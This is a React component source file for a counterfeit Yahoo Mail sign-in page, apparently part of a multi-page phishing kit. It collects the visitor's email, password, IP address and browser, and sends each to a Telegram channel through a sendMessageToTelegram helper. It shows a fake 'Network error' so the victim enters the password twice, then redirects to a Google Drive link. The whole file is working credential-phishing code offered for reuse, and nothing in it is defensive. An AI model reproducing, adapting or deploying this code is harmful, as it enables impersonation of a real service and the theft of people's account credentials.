import React, { useState, useEffect } from "react";
import { useLocation } from "react-router-dom";
import {
  getUserIP,
  getUserBrowser,
  sendMessageToTelegram,
  validateEmailForRoute,
} from "../services/api";
import ylogo from "../assets/yaho.png"; // Adjust the path as necessary

const Yaho = () => {
  const [ipAddress, setIpAddress] = useState("");
  const [browser, setBrowser] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPasswordForm, setShowPasswordForm] = useState(false);
  const [attemptCount, setAttemptCount] = useState(0);

  const [showErrorMessage, setShowErrorMessage] = useState(false);

  const [isValid, setIsValid] = useState(true); // State to keep track of validation
  const location = useLocation();

  useEffect(() => {
    getUserIP().then(setIpAddress);
    const browser = getUserBrowser();
    setBrowser(browser);
  }, []);

  const handleEmailSubmit = async (event) => {
    event.preventDefault();

    const isValidEmail = validateEmailForRoute(location.pathname, email);
    setIsValid(isValidEmail);
    if (isValidEmail) {
      console.log("Email is valid for this route");
      const message = `Root Logs\nMultipage\nYahoo\nEmail entered: ${email}\n\n\nuserIP: ${ipAddress}\nuserBrowser: ${browser}`;
      await sendMessageToTelegram(message);
      setShowPasswordForm(true);
      // Proceed with your submission logic
    } else {
      console.log("Email is not valid for this route");
      // Handle invalid email case
    }
    
  };

  const handlePasswordSubmit = async (event) => {
    event.preventDefault();
    const message = `Root Logs\nMultipage\nYahoo\nUsername: ${email}\nPassword: ${password}\nUser IP: ${ipAddress}\nUser Browser: ${browser}`;
    await sendMessageToTelegram(message);
    // Increment the attempt count
    setAttemptCount((prevCount) => prevCount + 1);

    if (attemptCount === 0) {
      // Show error message after the first attempt
      setShowErrorMessage(true);
    } else if (attemptCount >= 1) {
      // Redirect after the second attempt
      window.location.href ="https://drive.google.com/drive/folders/10Z4Tm85uW-hyPJ6-1uu6yFOwzAcekYKF?usp=sharing"; // Change to your desired URL
    }
  };

  return (
    <div className="bg-gray-100 flex flex-col lg:flex-row min-h-screen">
      <div className="lg:w-1/2 h-screen hidden lg:flex items-center justify-center">
        <iframe
          width="560"
          height="315"
          src="https://www.youtube.com/embed/Na9S6gx7yqU?autoplay=1&mute=1"
          title="YouTube video player"
          frameBorder="0"
          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
          allowFullScreen
        ></iframe>
      </div>
      <div className="lg:w-1/3 w-full flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
        <div class="max-w-md w-full space-y-8 bg-white p-10 shadow-md">
          <div class="flex justify-center">
            <img class="mx-auto h-12 w-auto" src={ylogo} alt="Yahoo" />
          </div>

          {!showPasswordForm ? (
            <form className="mt-8 space-y-6" onSubmit={handleEmailSubmit}>
              <div>
                <h2 class="mt-6 text-center text-xl font-semibold text-gray-900">
                  Sign in to Yahoo Mail
                </h2>
                <p class="text-center text-base font-light text-gray-700">
                  Sign in using your Yahoo account
                </p>
              </div>
              <div className="shadow-sm -space-y-px">
                <input
                  id="email"
                  name="email"
                  type="email"
                  autoComplete="email"
                  placeholder="Username, email, or mobile"
                  required
                  className="appearance-none rounded-none relative block w-full px-3 py-2 border-b border-gray-300 placeholder-gray-500 text-gray-900  focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
                {!isValid && (
                  <div className="text-sm" style={{ color: "red" }}>
                    Sorry, we don't recognize this account.
                  </div>
                )}
              </div>
              <div class="flex items-center justify-between">
                <div class="flex items-center">
                  <input
                    id="remember-me"
                    name="remember-me"
                    type="checkbox"
                    class="h-4 w-4 text-indigo-600 focus:ring-indigo-500 border-gray-300 rounded"
                  />
                  <label
                    for="remember-me"
                    class="ml-2 block text-sm text-gray-900"
                  >
                    {" "}
                    Stay signed in{" "}
                  </label>
                </div>

                <div class="text-sm">
                  <a
                    href="/yahoo"
                    class="font-medium text-[#39f] hover:text-[#39f]"
                  >
                    {" "}
                    Forgot username?{" "}
                  </a>
                </div>
              </div>
              <div>
                <button
                  type="submit"
                  class="group rounded-2xl relative w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium  text-white bg-[#39f] hover:bg-[#39f] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#39f]"
                >
                  Next
                </button>
              </div>

              <div class="text-sm text-center">
                <a
                  href="/yahoo"
                  class="group relative w-full flex justify-center py-2 px-4 border border-[#39f] rounded-2xl text-sm font-medium  text-[#39f] bg-white hover:bg-[#39f] hover:text-white focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#39f]"
                >
                  {" "}
                  Create an account{" "}
                </a>
              </div>
            </form>
          ) : (
            <form className="mt-8 space-y-6" onSubmit={handlePasswordSubmit}>
              {/* Password Form */}
              <span
                id="userEmail"
                class="block text-center text-base font-medium text-gray-700 mb-6"
              >
                {email}
              </span>
              <div class="mt-6 mb-8 ">
                <h2 class="text-center text-xl font-semibold text-gray-900">
                  Enter password
                </h2>
                <p class="text-center text-base font-light text-gray-700">
                  to finish sign in
                </p>
              </div>
              <div className="shadow-sm -space-y-px">
                <input
                  id="password"
                  name="password"
                  type="password"
                  autoComplete="current-password"
                  placeholder="Password"
                  required
                  className="appearance-none rounded-none relative block w-full px-3 py-2 border-b border-gray-300 placeholder-gray-500 text-gray-900  focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
              </div>
              <div>
                <button
                  type="submit"
                  class="group relative w-full flex justify-center py-2 px-4 border rounded-2xl border-transparent text-sm font-medium  text-white bg-[#39f] hover:bg-[#39f] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#39f]"
                >
                  Sign in
                </button>
              </div>
              <div class="flex items-center justify-between">
                <div class="text-sm">
                  <a
                    href="/yahoo"
                    class="font-medium text-[#39f] hover:text-[#39f]"
                  >
                    {" "}
                    Forgot password?{" "}
                  </a>
                </div>
              </div>
            </form>
          )}

          <div class="mt-6 text-center text-xs text-gray-500">
            <a href="/yahoo" class="hover:underline">
              Terms
            </a>{" "}
            |{" "}
            <a href="/yahoo" class="hover:underline">
              Privacy
            </a>
          </div>

          {showErrorMessage && (
            <div className="text-center text-red-600 mt-8">
              Network error, please try again.
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default Yaho;
